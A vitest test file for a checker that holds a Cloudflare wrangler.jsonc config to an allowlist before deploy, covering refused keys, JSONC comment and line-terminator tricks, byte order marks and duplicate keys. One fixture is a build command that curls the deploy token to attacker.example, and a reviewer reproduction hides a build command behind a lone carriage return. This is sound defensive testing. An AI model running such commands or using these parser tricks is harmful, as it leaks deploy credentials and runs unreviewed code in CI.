// The deploy job checks wrangler.jsonc against an allowlist before any step that holds the
// Cloudflare token (ADR 0011). wrangler runs `build.command` from the config in a shell, and `main`
// ships server code, so the config has to be data, not code: only these keys, and nothing else.
import { spawnSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { describe, expect, test } from 'vitest'
import {
  ALLOWED_ASSETS_KEYS,
  ALLOWED_TOP_LEVEL_KEYS,
  checkWranglerConfig,
  parseJsonc,
} from '../../infra/deploy/check-config.ts'

// The characters under test are built from their code points: a formatter turns a \u escape into
// the invisible character itself, which nobody can read in the source.
const LS = String.fromCharCode(0x2028) // line separator
const PS = String.fromCharCode(0x2029) // paragraph separator
const BOM = String.fromCharCode(0xfeff) // byte order mark

const root = fileURLToPath(new URL('../../', import.meta.url))
const CLI = `${root}infra/deploy/check-config.ts`
const committed = readFileSync(`${root}wrangler.jsonc`, 'utf8')
const withKey = (key: string, value: unknown): string =>
  JSON.stringify({ ...JSON.parse(committed), [key]: value })

describe('the committed wrangler.jsonc', () => {
  test('passes', () => {
    expect(checkWranglerConfig(committed)).toEqual([])
  })

  test('uses only keys the allowlist names, so it needs no exception', () => {
    const keys = Object.keys(JSON.parse(committed) as object)
    expect(
      keys.filter((key) => !(ALLOWED_TOP_LEVEL_KEYS as readonly string[]).includes(key)),
    ).toEqual([])
  })

  test('is the config the site needs: a name, a date, static assets from ./dist', () => {
    const config = JSON.parse(committed) as Record<string, unknown>
    expect(config.name).toBe('m3-tool')
    expect(config.compatibility_date).toMatch(/^\d{4}-\d{2}-\d{2}$/)
    expect(config.assets).toMatchObject({ directory: './dist', not_found_handling: '404-page' })
  })
})

describe('the allowlist', () => {
  test('names the keys an assets-only Worker needs, and nothing that runs code', () => {
    expect([...ALLOWED_TOP_LEVEL_KEYS].sort()).toEqual(
      ['$schema', 'assets', 'compatibility_date', 'name', 'preview_urls', 'workers_dev'].sort(),
    )
    expect([...ALLOWED_ASSETS_KEYS].sort()).toEqual(
      ['directory', 'html_handling', 'not_found_handling'].sort(),
    )
  })

  // Each of these makes wrangler run something, ship code, bind a resource, or change where the
  // Worker is published. None may pass.
  test.each([
    ['build', { command: 'curl -d "$CLOUDFLARE_API_TOKEN" https://attacker.example' }],
    ['main', 'src/worker.ts'],
    ['triggers', { crons: ['* * * * *'] }],
    ['routes', ['example.com/*']],
    ['route', 'example.com/*'],
    ['account_id', '0123456789abcdef'],
    ['vars', { A: '1' }],
    ['kv_namespaces', []],
    ['d1_databases', []],
    ['r2_buckets', []],
    ['services', []],
    ['durable_objects', { bindings: [] }],
    ['env', { production: {} }],
    ['site', { bucket: './dist' }],
    ['define', { A: '1' }],
    ['rules', []],
    ['minify', true],
    ['tsconfig', './tsconfig.json'],
    ['compatibility_flags', ['nodejs_compat']],
    ['limits', { cpu_ms: 10 }],
    ['observability', { enabled: true }],
    ['unsafe', { bindings: [] }],
    ['dev', { port: 1 }],
    ['keep_vars', true],
    ['name_typo', 'x'],
    ['', 'empty key'],
  ])('refuses the top-level key %j', (key, value) => {
    const problems = checkWranglerConfig(withKey(key, value))
    expect(problems).toHaveLength(1)
    expect(problems[0]).toContain(JSON.stringify(key))
  })

  test('refuses a build command however it is hidden among allowed keys', () => {
    const config = JSON.stringify({
      name: 'm3-tool',
      compatibility_date: '2026-11-23',
      assets: { directory: './dist' },
      workers_dev: true,
      build: { command: 'echo hi' },
      preview_urls: true,
    })
    expect(checkWranglerConfig(config)).toEqual([expect.stringContaining('"build"')])
  })

  test('reports every disallowed key, in the order they appear', () => {
    const problems = checkWranglerConfig('{"name":"m3-tool","main":"a.js","build":{},"vars":{}}')
    expect(problems.map((problem) => /"(\w+)"/.exec(problem)?.[1])).toEqual([
      'main',
      'build',
      'vars',
    ])
  })

  test.each([
    ['binding', 'ASSETS'],
    ['run_worker_first', true],
    ['base_path', '/x'],
    ['unknown', 1],
  ])('refuses the assets key %j: it needs a Worker script or changes the routes', (key, value) => {
    const config = JSON.stringify({
      name: 'm3-tool',
      assets: { directory: './dist', [key]: value },
    })
    const problems = checkWranglerConfig(config)
    expect(problems).toHaveLength(1)
    expect(problems[0]).toContain(`assets.${key}`)
  })

  test('accepts the assets keys it names', () => {
    const config = JSON.stringify({
      name: 'm3-tool',
      assets: {
        directory: './dist',
        not_found_handling: 'single-page-application',
        html_handling: 'auto-trailing-slash',
      },
    })
    expect(checkWranglerConfig(config)).toEqual([])
  })

  test.each([
    [{ name: '' }, 'name'],
    [{ name: 3 }, 'name'],
    [{ name: 'm3-tool', compatibility_date: 'today' }, 'compatibility_date'],
    [{ name: 'm3-tool', workers_dev: 'yes' }, 'workers_dev'],
    [{ name: 'm3-tool', preview_urls: 1 }, 'preview_urls'],
    [{ name: 'm3-tool', assets: 'dist' }, 'assets'],
    [{ name: 'm3-tool', assets: [] }, 'assets'],
    [{ name: 'm3-tool', assets: { directory: 5 } }, 'assets.directory'],
    [
      { name: 'm3-tool', assets: { directory: './dist', not_found_handling: 'redirect' } },
      'assets.not_found_handling',
    ],
    [
      { name: 'm3-tool', assets: { directory: './dist', html_handling: 'x' } },
      'assets.html_handling',
    ],
  ])('refuses a value of the wrong kind: %j', (config, field) => {
    const problems = checkWranglerConfig(JSON.stringify(config))
    expect(problems.length).toBeGreaterThan(0)
    expect(problems.join('\n')).toContain(field)
  })

  test('requires a name, because it names the Worker the token deploys', () => {
    const problems = checkWranglerConfig('{"compatibility_date":"2026-11-23"}')
    expect(problems.join('\n')).toContain('name')
  })
})

describe('what is not a config at all', () => {
  test.each([
    ['', 'an empty file'],
    ['   \n', 'only whitespace'],
    ['not json', 'text'],
    ['{"name": "m3-tool"', 'an unclosed object'],
    ['[]', 'an array'],
    ['null', 'null'],
    ['"m3-tool"', 'a string'],
    ['42', 'a number'],
    ['{"name": "m3-tool"} {"build": {}}', 'two documents'],
    ['{"name": "m3-tool"} /* unclosed', 'an unclosed comment'],
  ])('%j (%s) is refused, with a message', (text) => {
    const problems = checkWranglerConfig(text)
    expect(problems.length).toBeGreaterThan(0)
    expect(problems.every((problem) => problem.length > 10)).toBe(true)
  })
})

describe('JSONC: comments and trailing commas, as wrangler allows', () => {
  test('a commented config passes, and a comment can hide nothing from the check', () => {
    const text = `{
      // The Worker
      "name": "m3-tool", /* the name */
      "compatibility_date": "2026-11-23",
      "assets": { "directory": "./dist", },
      "workers_dev": true,
    }`
    expect(checkWranglerConfig(text)).toEqual([])
  })

  test('a key inside a comment is not a key', () => {
    expect(checkWranglerConfig('{"name":"m3-tool" /* "build": {"command":"x"} */}')).toEqual([])
    expect(checkWranglerConfig('{"name":"m3-tool" // "main": "x"\n}')).toEqual([])
  })

  test('a key after a comment is a key', () => {
    expect(checkWranglerConfig('{"name":"m3-tool", /* c */ "build": {}}')).toEqual([
      expect.stringContaining('"build"'),
    ])
    expect(checkWranglerConfig('{"name":"m3-tool", // c\n "build": {}}')).toEqual([
      expect.stringContaining('"build"'),
    ])
  })

  test('comment markers inside a string are text, and do not swallow what follows', () => {
    const text = '{"name":"// not a comment /* nor this */","build":{"command":"x"}}'
    expect(checkWranglerConfig(text)).toEqual([expect.stringContaining('"build"')])
  })

  test('an escaped quote does not end a string early', () => {
    const text = '{"name":"a\\"// still the name","build":{}}'
    expect(checkWranglerConfig(text)).toEqual([expect.stringContaining('"build"')])
  })

  test('a comma inside a string is not a trailing comma', () => {
    expect(parseJsonc('{"name":"a,}"}')).toEqual({ name: 'a,}' })
    expect(parseJsonc('{"list":["a,","b",],}')).toEqual({ list: ['a,', 'b'] })
  })

  test('a byte order mark is ignored', () => {
    expect(checkWranglerConfig(`${BOM}${committed}`)).toEqual([])
  })

  test('parseJsonc throws on text that is not JSON once comments and trailing commas are gone', () => {
    expect(() => parseJsonc('{name: 1}')).toThrow()
    expect(() => parseJsonc("{'name': 1}")).toThrow()
    expect(() => parseJsonc('{"a": 1,, }')).toThrow()
  })
})

describe('comment terminators, as wrangler reads them (review N1)', () => {
  // wrangler parses with jsonc-parser, which ends a // comment at \n, at \r\n, and at a lone \r.
  // A checker that ends it at \n only reads `// note<CR>"build": {...}` as one comment while
  // wrangler reads a build command.
  test.each([
    ['LF', '\n'],
    ['CRLF', '\r\n'],
    ['a lone CR', '\r'],
  ])('a // comment ends at %s', (_label, terminator) => {
    expect(parseJsonc(`{"a":1, // note${terminator}"b":2}`)).toEqual({ a: 1, b: 2 })
  })

  const REVIEWER_REPRO =
    '{"name":"m3-tool","compatibility_date":"2026-11-23","assets":{"directory":"./dist"}, // note\r' +
    '"build":{"command":"echo RAN_BUILD_COMMAND > pwned.txt"}\n}'

  test("the reviewer's reproduction is refused, and the build command is named", () => {
    const problems = checkWranglerConfig(REVIEWER_REPRO)
    expect(problems.join('\n')).toContain('"build"')
    expect(problems.join('\n')).toMatch(/carriage return/i)
  })

  test('so is a main script hidden the same way', () => {
    const problems = checkWranglerConfig('{"name":"m3-tool", // note\r"main":"x.js"}')
    expect(problems.join('\n')).toContain('"main"')
  })

  test('the CLI exits 1 for the reproduction', async () => {
    const { mkdtemp, writeFile, rm } = await import('node:fs/promises')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = await mkdtemp(join(tmpdir(), 'wrangler-config-'))
    try {
      const file = join(dir, 'wrangler.jsonc')
      await writeFile(file, REVIEWER_REPRO)
      const result = spawnSync(process.execPath, [CLI, file], { encoding: 'utf8', cwd: root })
      expect(result.status).toBe(1)
      expect(result.stderr).toContain('"build"')
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test('a file with CRLF line endings throughout is fine', () => {
    expect(checkWranglerConfig(committed.replace(/\r?\n/g, '\r\n'))).toEqual([])
  })
})

describe('what is refused outright, because two parsers might read it differently (defense in depth)', () => {
  const valid = '{"name":"m3-tool","compatibility_date":"2026-11-23"}'

  test.each([
    ['a lone carriage return between tokens', '{"name":"m3-tool"\r}', /carriage return/i],
    [
      'a lone carriage return inside a comment',
      '{"name":"m3-tool" /* a\rb */}',
      /carriage return/i,
    ],
    [
      'a lone carriage return before a line feed pair',
      '{"name":"m3-tool",\r\r\n"compatibility_date":"2026-11-23"}',
      /carriage return/i,
    ],
    [
      'a line separator (U+2028) in whitespace',
      `{"name":"m3-tool",${LS}"compatibility_date":"2026-11-23"}`,
      /U\+2028|line separator/i,
    ],
    [
      'a line separator (U+2028) in a comment',
      `{"name":"m3-tool", // note${LS}"build":{}\n}`,
      /U\+2028|line separator/i,
    ],
    [
      'a paragraph separator (U+2029)',
      `{"name":"m3-tool",${PS}"compatibility_date":"2026-11-23"}`,
      /U\+2029|paragraph separator/i,
    ],
    ['a line separator inside a string', `{"name":"m3${LS}tool"}`, /U\+2028|line separator/i],
    [
      'a byte order mark after the first character',
      `${valid.slice(0, 1)}${BOM}${valid.slice(1)}`,
      /byte order mark/i,
    ],
    ['two byte order marks at the start', `${BOM}${BOM}${valid}`, /byte order mark/i],
    ['a byte order mark at the end', `${valid}${BOM}`, /byte order mark/i],
  ])('%s', (_label, text, message) => {
    const problems = checkWranglerConfig(text)
    expect(problems.length).toBeGreaterThan(0)
    expect(problems.join('\n')).toMatch(message)
  })

  test('a single byte order mark at the start is accepted, as wrangler accepts it', () => {
    expect(checkWranglerConfig(`${BOM}${valid}`)).toEqual([])
  })

  describe('duplicate keys, at any level', () => {
    test.each([
      ['at the top level', '{"name":"m3-tool","name":"other"}', '"name"'],
      [
        'in assets',
        '{"name":"m3-tool","assets":{"directory":"./dist","directory":"./other"}}',
        '"directory"',
      ],
      ['hidden behind an escape', '{"name":"m3-tool","\\u006eame":"other"}', '"name"'],
      ['across a comment', '{"name":"m3-tool", /* c */ "name":"other"}', '"name"'],
      [
        'in an object inside an array',
        '{"name":"m3-tool","assets":{"directory":"./dist"},"extra":[{"a":1,"a":2}]}',
        '"a"',
      ],
      ['in a nested object three deep', '{"name":"m3-tool","x":{"y":{"z":1,"z":2}}}', '"z"'],
    ])('%s', (_label, text, key) => {
      const problems = checkWranglerConfig(text)
      expect(problems.join('\n')).toMatch(/duplicate/i)
      expect(problems.join('\n')).toContain(key)
    })

    test('the same key in different objects is not a duplicate', () => {
      const text =
        '{"name":"m3-tool","assets":{"directory":"./dist"},"x":{"directory":"a"},"y":[{"directory":"b"},{"directory":"c"}]}'
      expect(checkWranglerConfig(text).join('\n')).not.toMatch(/duplicate/i)
    })

    test('a key that matches a string value is not a duplicate', () => {
      expect(checkWranglerConfig('{"name":"name"}')).toEqual([])
      expect(checkWranglerConfig('{"name":"m3-tool","compatibility_date":"2026-11-23"}')).toEqual(
        [],
      )
    })

    test('a duplicate of a key the allowlist refuses is reported as both', () => {
      const problems = checkWranglerConfig('{"name":"m3-tool","build":{},"build":{}}')
      expect(problems.join('\n')).toMatch(/duplicate/i)
      expect(problems.join('\n')).toContain('is not allowed')
    })
  })
})

describe('the command line', () => {
  const run = (...args: string[]) =>
    spawnSync(process.execPath, [CLI, ...args], { encoding: 'utf8', cwd: root })

  test('exits 0 and prints nothing for the committed config', () => {
    const result = run('wrangler.jsonc')
    expect({ code: result.status, out: result.stdout, err: result.stderr }).toEqual({
      code: 0,
      out: '',
      err: '',
    })
  })

  test('exits 1 and names each problem when a key is not allowed', async () => {
    const { mkdtemp, writeFile, rm } = await import('node:fs/promises')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = await mkdtemp(join(tmpdir(), 'wrangler-config-'))
    try {
      const file = join(dir, 'wrangler.jsonc')
      await writeFile(file, withKey('build', { command: 'echo' }))
      const result = run(file)
      expect(result.status).toBe(1)
      expect(result.stderr).toContain('"build"')
      expect(result.stdout).toBe('')
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test('exits 2 with a usage line for no argument, and for a file that is not there', () => {
    const none = run()
    expect(none.status).toBe(2)
    expect(none.stderr).toMatch(/usage/i)
    const missing = run('no-such-file.jsonc')
    expect(missing.status).toBe(2)
    expect(missing.stderr).toMatch(/no-such-file\.jsonc/)
  })

  test('has no dependencies: it imports nothing but node: modules', () => {
    const source = readFileSync(CLI, 'utf8')
    const specifiers = [...source.matchAll(/(?:from|import\()\s*['"]([^'"]+)['"]/g)].map(
      (m) => m[1],
    )
    expect(specifiers.every((specifier) => specifier?.startsWith('node:'))).toBe(true)
  })
})
